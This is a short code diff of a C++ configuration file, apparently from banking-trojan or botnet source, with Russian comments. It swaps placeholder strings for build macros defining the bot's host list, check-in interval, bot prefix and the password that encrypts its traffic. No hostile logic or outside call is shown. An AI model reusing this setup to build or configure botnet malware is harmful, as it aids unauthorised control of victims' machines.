@@ -42,7 +42,7 @@ namespace CONFIGDEBUGSTRINGS
 	//
 	//  host1.com\0host2.com\0host3.com\0\0
 	//****************************************************************************
-	char BOT_HOSTS_ARRAY[MAX_HOSTS_BUF_SIZE] = "ALL_HOSTS_BUFFER\0\0";
+	char BOT_HOSTS_ARRAY[MAX_HOSTS_BUF_SIZE] = BOTPARAM_MAINHOSTS;
 
 	#define HASH_EMPTY_HOSTS_BUF  0xE98F4C1C /* ALL_HOSTS_BUFFER */
 
@@ -50,13 +50,13 @@ namespace CONFIGDEBUGSTRINGS
 	//----------------------------------------------------------------------------
 	// Интервал отстука (в минутах). Строковое значение
 	//----------------------------------------------------------------------------
-	char Delay[MAX_DELAY_SIZE + 1]  = "DELAY_\0";
+	char Delay[MAX_DELAY_SIZE + 1]  = BOTPARAM_DELAY;
 	#define DELAY_PARAM_NAME_HASH 0x59906EFB /* DELAY_ */
 
 	//----------------------------------------------------------------------------
 	// Префикс бота
 	//----------------------------------------------------------------------------
-	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = "BOT_UID\0";
+	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = BOTPARAM_PREFIX;
 
 	//----------------------------------------------------------------------------
 	// Префикс бота работающего в режиме Банк
@@ -67,7 +67,7 @@ namespace CONFIGDEBUGSTRINGS
 	//----------------------------------------------------------------------------
 	// Основной пароль бота. Весь трафик будет шифроваться этим паролем
 	//----------------------------------------------------------------------------
-	char MainPassword[MAX_PASSWORD_SIZE + 1] = "MAIN_PASSWORD\0";
+	char MainPassword[MAX_PASSWORD_SIZE + 1] = BOTPARAM_MAINPASSWORD;
 	#define MainPasswordNameHash 0x618ADDBE /*MAIN_PASSWORD*/
 
 
